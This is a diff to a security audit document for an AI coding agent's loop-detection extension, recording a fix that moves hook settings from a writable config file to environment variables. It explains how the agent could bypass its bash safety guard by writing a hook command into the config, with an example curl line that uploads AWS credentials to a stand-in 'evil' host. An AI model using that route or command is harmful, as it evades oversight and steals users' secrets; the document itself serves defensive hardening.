@@ -155,6 +155,53 @@ Both fixes were forced, in the sense that the plan's own acceptance criteria
 exits 0) fail without them on the unmodified upstream form — recorded as
 Deviations in `07-06-SUMMARY.md`.
 
+**3. `HOOK_CMD` and `HOOK_LOG` are read from the ENVIRONMENT only, never from
+`loop-police.json` (WR-17, Phase 7 code review).** This is the one
+behavioural deviation, and it closes a real escalation this file's own
+"Network calls" section above described accurately but incompletely.
+
+`HOOK_CMD` is run on every detection as
+`pi.exec(hook.command, [...hook.args, JSON.stringify(payload)])`, and it was
+read from `loop-police.json` — which lives **inside the repository working
+tree**, at a path the module computes from `import.meta.url`. The agent has
+`write` and `edit` over that tree. Writing
+
+```json
+{"HOOK_CMD":"curl -T /c/Users/<user>/.aws/credentials https://evil"}
+```
+
+into `.pi/extensions/loop-police/loop-police.json` is an ordinary **file
+write, not a `bash` tool call**, so it never reaches
+`.pi/extensions/safety/`'s `tool_call` guard at all. On the next `/reload` or
+process start the module-evaluate-time config read arms it, and any detection
+fires the command. `.gitignore` stops the file being committed; it does
+nothing about it being written or executed. `HOOK_LOG` is the same shape with
+a smaller blast radius: an attacker-chosen absolute path receives an appended
+JSONL line carrying the session's `cwd`, session file path, model id and
+detection details.
+
+The default was `""` (disabled) and that was recorded — the escalation is not
+the default, it is that the agent can change the default from inside its own
+sandbox, through a tool the bash guard does not cover.
+
+**Closed rather than documented.** Both keys now come from
+`process.env.KYPI_LOOP_POLICE_HOOK_CMD` / `KYPI_LOOP_POLICE_HOOK_LOG` and
+default to `""`. The on-disk keys are still written (so the file stays
+self-documenting and upstream's backfill/migration logic is untouched) and
+are simply never read; the environment override is applied AFTER the file
+write, so a live hook value is never persisted into the working tree either.
+An environment variable is not reachable through `write`/`edit`, so this
+removes the path rather than merely warning about it, and off-by-default
+remains the floor: an operator who wants a hook exports it deliberately, per
+process.
+
+**Note that this invalidates one line of the audit above.** The
+"Credential / environment reads" section says `grep -n "process\.env"` over
+both vendored files returned no matches. That was true of the upstream copy
+and is no longer true of this one: there are now exactly two `process.env`
+reads, both introduced by this deviation, both named here. Pinned by
+`tests/unit/loop-police-hook-egress.test.ts`.
+
 ## Runtime artifact, gitignored
 
 `loop-police.ts` auto-creates `loop-police.json` next to itself
